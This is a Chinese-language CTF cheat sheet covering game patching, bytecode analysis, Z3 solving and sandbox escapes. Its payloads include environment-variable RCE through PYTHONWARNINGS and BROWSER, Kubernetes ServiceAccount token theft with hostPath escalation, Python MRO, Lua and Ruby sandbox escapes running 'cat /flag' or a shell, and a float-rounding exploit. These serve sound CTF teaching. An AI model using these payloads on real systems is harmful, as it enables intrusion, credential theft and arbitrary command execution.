# CTF Misc - 游戏、虚拟机与约束求解（第1部分）

## 目录
- [通过补丁利用WASM游戏](#wasm-game-exploitation-via-patching)
- [Roblox Place文件逆向](#roblox-place-file-reversing)
- [PyInstaller提取](#pyinstaller-extraction)
  - [操作码重映射](#opcode-remapping)
- [Marshal代码分析](#marshal-code-analysis)
  - [字节码检查技巧](#bytecode-inspection-tips)
- [Python环境RCE](#python-environment-rce)
- [Z3约束求解](#z3-constraint-solving)
  - [结合Z3的YARA规则](#yara-rules-with-z3)
  - [将类型系统视为约束](#type-systems-as-constraints)
  - [Z3 SAT求解布尔逻辑门网络（BSidesSF 2026）](#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026)
- [Kubernetes RBAC绕过](#kubernetes-rbac-bypass)
  - [K8s权限提升清单](#k8s-privilege-escalation-checklist)
- [浮点精度利用](#floating-point-precision-exploitation)
  - [寻找可利用的值](#finding-exploitable-values)
  - [利用策略](#exploitation-strategy)
  - [为何可行](#why-it-works)
  - [挑战中的红旗](#red-flags-in-challenges)
  - [快速测试脚本](#quick-test-script)
- [自定义汇编语言沙箱逃逸（EHAX 2026）](#custom-assembly-language-sandbox-escape-ehax-2026)
- [通过函数名注入的Lua沙箱逃逸（CSAW CTF 2016）](#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)
- [通过TracePoint.trace的Ruby沙箱逃逸（HITCON 2017）](#ruby-sandbox-escape-via-tracepointtrace-hitcon-2017)
- [像素采样BFS迷宫自动解题器（HackCon 2018）](#pixel-sampling-bfs-maze-auto-solver-hackcon-2018)
- [参考文献](#references)

---

## 通过补丁利用WASM游戏

**模式（Tac Tic Toe，Pragyan 2026）：** WebAssembly中有一个无敌AI的游戏。证明/验证系统验证走法，但不检查最优性。

**关键洞察：** 如果证明生成仅依赖于走法位置和种子（而非走法是否最优），则通过补丁修改WASM使AI表现糟糕，可以得到一个可被击败且证明有效的游戏。

**补丁流程：**
```bash
# 1. 将WASM二进制转换为文本格式
wasm2wat main.wasm -o main.wat

# 2. 找到minimax函数（查找bestScore初始化）
# 将初始bestScore从-1000改为1000
# 翻转比较操作：i64.lt_s -> i64.gt_s（选择最差走法而非最佳）

# 3. 重新编译
wat2wasm main.wat -o main_patched.wasm
```

**利用示例：**
```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
// 对抗弱化的AI下获胜走法
for (const m of [0, 3, 6]) {
    PlayerMove(m);
}
const data = GetWinData();
// 向服务器提交 data.moves 和 data.proof -> 有效！
```

**通用经验：** 在客户端游戏挑战中，务必检查验证/证明系统是否独立于走法质量。如果是，优先补丁游戏逻辑，而非尝试击败AI。

---

## Roblox Place文件逆向

**模式（MazeRunna，0xFun 2026）：** Roblox游戏中，flag隐藏在较早发布的版本中。最新版本包含诱饵flag。

**步骤1：从游戏页面HTML中识别目标ID：**
```python
placeId = 75864087736017
universeId = 8920357208
```

**步骤2：通过Roblox资产交付API拉取place版本：**
```bash
# 需要 .ROBLOSECURITY cookie（CTF后请更换！）
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

**步骤3：解析.rbxlbin二进制格式：**
Roblox二进制place格式包含类型块：
- **INST** — 定义类桶（Script、Part等）和引用ID
- **PROP** — 每个实例的属性值（包括脚本的`Source`）
- **PRNT** — 父子关系，构成对象树

```python
# 提取脚本的伪代码
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
```

**步骤4：对比不同版本的脚本源码。**
- v3（最新）：`Workspace/Stand/Color/Script` → 伪flag
- v2（较旧）：同路径 → 真flag

**关键经验：**
- 始终检查**版本历史** — 最新版本可能是诱饵
- Roblox资产交付API暴露所有已发布版本
- 使用后立即更换`.ROBLOSECURITY` cookie（它是完整会话令牌）

---
## PyInstaller 提取

```bash
python pyinstxtractor.py packed.exe
# 查看 packed.exe_extracted/ 目录
```

### 操作码重映射
如果反编译时出现操作码错误：
1. 找到修改过的 `opcode.pyc`
2. 构建到原始值的映射
3. 修补目标 .pyc 文件
4. 正常反编译

---

## Marshal 代码分析

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

### 字节码检查技巧
- `co_consts` 包含字面量值（字符串、数字）
- `co_names` 包含引用的名称（函数名、变量）
- `co_code` 是原始字节码
- 使用 `dis.Bytecode(code)` 进行指令级迭代

---

## Python 环境 RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**其他危险的环境变量：**
- `PYTHONSTARTUP` - 交互式启动时执行的脚本
- `PYTHONPATH` - 通过路径劫持注入模块
- `PYTHONINSPECT` - 脚本执行后进入交互式 shell

**PYTHONWARNINGS 工作原理：** 设置 `PYTHONWARNINGS=ignore::antigravity.Foo::0` 会触发 `import antigravity`，该模块通过 `$BROWSER` 打开 URL。控制 `$BROWSER` 即可执行任意命令。

---

## Z3 约束求解

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # 已知前缀
# 添加约束...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

### 使用 Z3 的 YARA 规则
```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()

# 字面字节
for i, byte in enumerate([0x66, 0x6C, 0x61, 0x67]):
    s.add(flag[i] == byte)

# 字符范围
for i in range(4):
    s.add(flag[i] >= ord('A'))
    s.add(flag[i] <= ord('Z'))

if s.check() == sat:
    m = s.model()
    print(bytes([m[f].as_long() for f in flag]))
```

### 类型系统作为约束
**OCaml GADTs / 高级类型编码约束。**

不编译 - 用正则提取约束并用 Z3 求解：
```python
import re
from z3 import *

matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# 转换为 Z3 约束并求解
```

### Z3 SAT 求解布尔逻辑门网络（BSidesSF 2026）

**示例（flag-factory-pro）：** 一个“产品密钥”验证系统实现为由 250 个布尔逻辑门（AND、OR、XOR、NOT）和连线组成的网络。给定 125 个布尔输入位和门的真值（所有门输出均为 True），求一个有效的输入位赋值。这是经典的可满足性（SAT）问题，可用 Z3 解决。

```python
from z3 import *
import base64

# 从挑战数据解析门网络
data = base64.b64decode(registration_request)
gates = parse_gates(data)  # (gate_type, input_wires, output_wire) 列表

# 创建 125 个布尔变量作为输入位
inputs = [Bool(f"x_{i}") for i in range(125)]

# 线 ID 映射到 Z3 表达式
wires = {i: inputs[i] for i in range(125)}

solver = Solver()
for gate_type, in1, in2, out in gates:
    w1 = wires[in1]
    w2 = wires[in2] if in2 is not None else None

    if gate_type == "AND":
        wires[out] = And(w1, w2)
    elif gate_type == "OR":
        wires[out] = Or(w1, w2)
    elif gate_type == "XOR":
        wires[out] = Xor(w1, w2)
    elif gate_type == "NOT":
        wires[out] = Not(w1)

    # 所有门输出必须为 True
    solver.add(wires[out] == True)

if solver.check() == sat:
    model = solver.model()
    # 提取 125 位，按 5 位分组编码为 base32
    bits = [1 if is_true(model[inputs[i]]) else 0 for i in range(125)]
    # 转换为产品密钥格式
    key = bits_to_base32(bits)
    print(f"Product key: {key}")
```

**关键洞察：** 布尔逻辑门网络可直接表达为 Z3 约束。每个门对应一个约束（`And`、`Or`、`Xor`、`Not`），且所有输出为 True 限制了解空间。即使有 125 个输入变量和 250 个门，Z3 也能在毫秒级解决。任何带有可观察验证逻辑的“keygen”或“产品密钥”挑战都可用此方法建模。

**识别时机：** 挑战涉及产品密钥验证、许可证密钥生成、电路/门图或注册码验证。若验证逻辑可提取（来自二进制、网络抓包或提供的规格），则建模为 SAT/SMT 问题。Z3 支持布尔、位向量、整数和实数算术约束。

**参考：** BSidesSF 2026 “flag-factory-pro”

---
## Kubernetes RBAC 绕过

**模式（CTFaaS，LACTF 2026）：** 声称有 ServiceAccount 隔离的容器部署者。

**攻击链：**
1. 部署探测容器，读取 Pod 内的 ServiceAccount 令牌，路径为 `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. 验证令牌是否能模拟部署者的 ServiceAccount（常见错误配置）
3. 创建带有 `hostPath` 卷挂载 `/` 的 Pod -> 读取节点文件系统
4. 提取 kubeconfig（例如 `/etc/rancher/k3s/k3s.yaml`）
5. 使用节点凭据访问隐藏的命名空间并读取 secrets

```bash
# 在 Pod 内部执行：
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

### K8s 权限提升检查清单
- 检查 RBAC：`kubectl auth can-i --list`
- 查找是否有创建 Pod 的权限（能创建特权 Pod）
- 检查 PSP/PSA 中是否允许 hostPath 卷挂载
- 查找其他 Pod 环境变量中的 secrets
- 检查服务网格 sidecar 是否泄露凭据

---

## 浮点数精度利用

**模式（Spare Me Some Change）：** 交易/经济类游戏中，大倍数放大微小浮点误差。

**关键洞察：** 当小数值（0.01-0.99）乘以大数（如 1e15）时，浮点表示误差产生的分数余数可被利用。

### 寻找可利用的值
```python
mult = 1000000000000000  # 10^15

# 找出乘法产生有用分数误差的值
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# 常见带正分数的值：
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### 利用策略
1. **确定约束条件**：需要 `balance >= price` 且 `inventory >= fee`
2. **找到有利的浮点误差**：`x * mult` 有正分数部分的值
3. **关键技巧**：卖出库存的整数部分，保留分数部分作为“免费资金”

**示例（时光旅行交易游戏）：**
```text
初始：balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
倍数：1e15（时光旅行）

# 买入 0.56，穿越时光：
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# 卖出正好 560000000000000（整数部分）：
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0（浮点四舍五入！）
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# 现在：balance >= flag_price 且 inventory >= fee
```

### 原理解析
- Float64 有约 15-16 位有效数字精度
- `(5.0 - 0.56) * 1e15` 精度丢失 -> 加法时四舍五入为精确的 5e15
- `0.56 * 1e15` 保留了 0.0625 的分数部分作为“免费库存”
- 非对称的四舍五入让你获得比起始值略多的总价值

### 挑战中的红旗
- “时光旅行放大一切”（大倍数）
- 买卖交易游戏带特殊操作
- 带手续费或阈值的小数货币
- 某些操作后“不允许小数”（强制整数交易）
- 初始值看似用正常数学无法获胜

### 快速测试脚本
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """寻找 x，使卖出 int(x*mult) 后 balance>=所需且 inventory>=所需"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # 不能买超过余额
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # 卖出库存的整数部分
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: 买入 {x}, 卖出 {sell}')
            print(f'  最终余额={final_bal}, 最终库存={final_inv}')
            return x
    return None

# 示例用法：
find_exploit(1e15, 5e15, 0.05)  # 返回 0.56
```

---
## Custom Assembly Language Sandbox Escape (EHAX 2026)

**Pattern (Chusembly):** 使用自定义指令集（LD、PUSH、PROP、CALL、IDX 等）的 Web 应用，运行在 Python 后端。安全检查仅阻止源代码中出现单词 "flag"。

**关键洞察：** `PROP`（属性访问）和 `CALL`（函数调用）指令允许从任意对象遍历 Python 的 MRO 链以实现远程代码执行（RCE），类似于 Jinja2 SSTI。

**利用链：**
```text
LD 0x48656c6c6f A     # 将字符串 "Hello" 加载到寄存器 A
PROP __class__ A      # str → <class 'str'>
PROP __base__ E       # str → <class 'object'> (E = 结果寄存器)
PROP __subclasses__ E # object → 绑定方法
CALL E                # object.__subclasses__() → 所有类的列表
# 找到索引 138 处的 os._wrap_close（根据 Python 版本不同而异）
IDX 138 E             # subclasses[138] = os._wrap_close
PROP __init__ E       # 获取 __init__ 方法
PROP __globals__ E    # 访问函数的全局变量
# 使用 __getitem__ 访问内置模块，避免触发关键字过滤
PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" 的十六进制表示
CALL __getitem__ E               # globals["__builtins__"]
# 使用十六进制编码绕过 "flag" 关键字过滤
PUSH 0x666c61672e747874          # "flag.txt" 的十六进制表示
CALL open E                      # open("flag.txt")
CALL read E                      # 读取文件内容
STDOUT E                         # 打印 flag
```

**过滤绕过技巧：**
- **十六进制编码字符串：** `0x666c61672e747874` → `"flag.txt"`，绕过关键字过滤
- **使用 os.popen 执行 shell 命令：** 如果文件路径未知，先用 `os.popen('ls /').read()`，再用 `os.popen('cat /flag*').read()`
- **子类索引发现：** 遍历 `__subclasses__()` 列表寻找有用的类（如 os._wrap_close、subprocess.Popen 等）

**自定义语言挑战的一般思路：**
1. **阅读文档：** 检查 `/docs`、`/help`、`/api` 端点获取指令参考
2. **找到结果寄存器：** 许多自定义语言有专门的返回值寄存器
3. **测试字符串处理：** 尝试使用十六进制编码字符串绕过关键字过滤
4. **链式调用 Python MRO：** 任意 Python 字符串对象 → `__class__.__base__.__subclasses__()` → RCE
5. **错误信息泄露信息：** 故意触发错误以暴露 Python 内部结构和可用类

---

## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)

Lua 沙箱通过函数名过滤 `load()` 和 `os.execute()`，但如果函数引用存在于其他可访问表中，或者通过字符串拼接函数名，则可以绕过。

```lua
-- 常见的 Lua 沙箱限制：
-- 阻止 os.execute，阻止 load，阻止 require

-- 绕过方法 1：如果 string.find 可用，先检测允许的函数
-- 然后通过表索引访问
local f = os["execute"]  -- 如果只阻止 os.execute() 调用，可用表索引绕过
f("cat /flag")

-- 绕过方法 2：使用 loadstring（Lua 5.1 中 load 的别名）
loadstring("os.execute('cat /flag')")()

-- 绕过方法 3：通过 debug 库（如果可用）
debug.getregistry()  -- 访问 Lua 内部注册表

-- 绕过方法 4：字节码执行（在外部编译，加载字节码）
-- 编译载荷：luac -o payload.luac payload.lua
-- 在沙箱中加载字节码（可能绕过源码级过滤）

-- 绕过方法 5：拼接构造函数名
local cmd = "exe" .. "cute"
os[cmd]("cat /flag")

-- 绕过方法 6：通过 io 库
io.popen("cat /flag"):read("*a")
```

**关键洞察：** Lua 沙箱通常过滤特定函数的*调用*，但不过滤*表索引*。可以通过表索引（`os["execute"]`）、字符串拼接构造函数名，或使用替代 I/O 库（`io.popen`）访问被阻止的函数。还要检查 `loadstring`（Lua 5.1 中 `load` 的别名）是否未被阻止。

---
## Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)

**模式：** Ruby 沙箱使用 `set_trace_func` 监控执行并阻止危险调用。绕过方法：注册一个针对 `:c_call` 事件的 `TracePoint` 钩子。TracePoint 在 C 扩展层面触发，早于 Ruby 级别的 `set_trace_func` 钩子激活。

```ruby
TracePoint.trace(:c_call) do |tp|
  system('sh')
end
```

该钩子会在下一次 C 级调用（例如 `puts`，任何方法调用）时触发，在沙箱监控拦截之前执行 `system('sh')`。

**为何有效：** `TracePoint`（Ruby 2.0 引入）运行在比 `set_trace_func` 更底层的层级。`:c_call` 钩子在任何 C 实现的方法被调用时触发，这发生在 `set_trace_func` 依赖的 Ruby 事件系统处理事件之前。

**关键洞察：** `TracePoint` 在 Ruby 中运行于比 `set_trace_func` 更底层——C 调用钩子先于 Ruby 级事件钩子触发，从而实现沙箱逃逸。任何后续的 C 方法调用（即使是无害的）都会触发该 payload。

---

## Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)

**模式：** 挑战会流式传输一个网格迷宫的 PNG，要求玩家在严格的时间限制内输入 WASD 移动。手动大规模解谜几乎不可能，但迷宫是均匀网格——每个格子宽度正好为 `N` 像素，每堵墙宽度为 1 格。

**解题流程：**
```python
import requests, numpy as np
from collections import deque
from PIL import Image
from io import BytesIO

CELL = 10  # 测量得到的格子宽度（像素）

def fetch_grid(url):
    img = np.array(Image.open(BytesIO(requests.get(url).content)).convert('L'))
    rows, cols = img.shape[0] // CELL, img.shape[1] // CELL
    # 1 = 墙（格子中心的暗像素），0 = 通路
    grid = [[1 if img[r*CELL + CELL//2, c*CELL + CELL//2] < 128 else 0
             for c in range(cols)] for r in range(rows)]
    return grid

def bfs(grid, start, goal):
    dirs = [(-1, 0, 'W'), (1, 0, 'S'), (0, -1, 'A'), (0, 1, 'D')]
    q = deque([(start, '')])
    seen = {start}
    while q:
        (r, c), path = q.popleft()
        if (r, c) == goal:
            return path
        for dr, dc, m in dirs:
            nr, nc = r + dr, c + dc
            if (0 <= nr < len(grid) and 0 <= nc < len(grid[0])
                    and grid[nr][nc] == 0 and (nr, nc) not in seen):
                seen.add((nr, nc))
                q.append(((nr, nc), path + m))
```

通过检查图像第一行测量 `CELL`，然后同系列的每个迷宫都能解码成布尔网格，BFS 在毫秒级别内输出移动序列。

**关键洞察：** 任何基于图像的 CTF 游戏都可以通过对每个逻辑格子采样一个像素转化为图论问题——采样格子中心而非边界，避免墙体厚度干扰结果。构建网格，BFS 搜索，输出移动字符串。同样的模式适用于彩色编码迷宫（`img[r*CELL+CELL//2, c*CELL+CELL//2]` 进行 RGB 比较）以及经过仿射校正的 3D 等距网格。

**参考：** HackCon 2018 — writeup 10764

---

## 参考资料
- Pragyan 2026 "Tac Tic Toe"：WASM 极小化补丁
- LACTF 2026 "CTFaaS"：通过 hostPath 绕过 K8s RBAC
- 0xL4ugh CTF：PyInstaller + 操作码重映射
- 0xFun 2026 "MazeRunna"：Roblox 版本历史 + 二进制 place 文件解析
- EHAX 2026 "Chusembly"：带 Python MRO 链的自定义汇编语言 RCE
- HITCON 2017：Ruby TracePoint 沙箱逃逸

---

另见：[games-and-vms-2.md](games-and-vms-2.md) 涉及 cookie 检查点暴力破解、Flask cookie 游戏状态泄露、WebSocket 游戏操控、服务器时间验证绕过、De Bruijn 序列、Brainfuck 插装和 WASM 内存操作。

另见：[games-and-vms-3.md](games-and-vms-3.md) 涉及 memfd_create 打包二进制、多阶段带 HMAC 承诺-揭示和 GF(256) Nim 的加密游戏、模拟器 ROM 切换状态保存、Python marshal 代码注入、本福特定律绕过、并行连接 oracle 中继、非ogram 解题流程、100 囚徒问题、通过表情符号标识符逃逸 C 代码沙箱，以及 BuildKit 守护进程构建密钥利用。
